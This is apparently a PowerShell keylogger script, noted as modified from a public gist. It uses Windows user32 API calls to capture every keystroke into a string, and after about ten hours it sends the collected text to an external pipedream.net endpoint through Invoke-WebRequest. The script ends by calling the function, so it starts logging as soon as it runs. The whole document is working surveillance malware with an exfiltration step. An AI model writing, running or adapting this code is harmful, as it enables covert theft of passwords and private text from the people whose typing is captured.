# modified from https://gist.github.com/dasgoll/7ca1c059dd3b3fbc7277

function Start-KeyLogger() {
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

$null = New-Item -Path $Path -ItemType File -Force

try{
    $str1 = ""
    $count = 0
    $secs = 0
    $mins = 0
    while ($true) {
        Start-Sleep -Milliseconds 40
        $count = $count + 1

        if ($count -gt 24) {
            $count = 0
            $secs = $secs + 1
        }

        if ($secs -gt 59) {
            $secs = 0
            $mins = $mins + 1
        }

        if ($mins -gt 599) {
            $str1 = "https://endp6vtqtejjwy9.m.pipedream.net?a="+$str1
            Invoke-WebRequest -URI $str1
            break
        }
      
        for ($ascii = 9; $ascii -le 254; $ascii++) {
            $state = $API::GetAsyncKeyState($ascii)

            if ($state -eq -32767) {
                $null = [console]::CapsLock

                $virtualKey = $API::MapVirtualKey($ascii, 3)

                $kbstate = New-Object Byte[] 256
                $checkkbstate = $API::GetKeyboardState($kbstate)

                $mychar = New-Object -TypeName System.Text.StringBuilder

                $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                if ($success) {
                    $str1 = $str1 + $mychar
                }
            }
        }
    }
}
finally{}
}

Start-KeyLogger
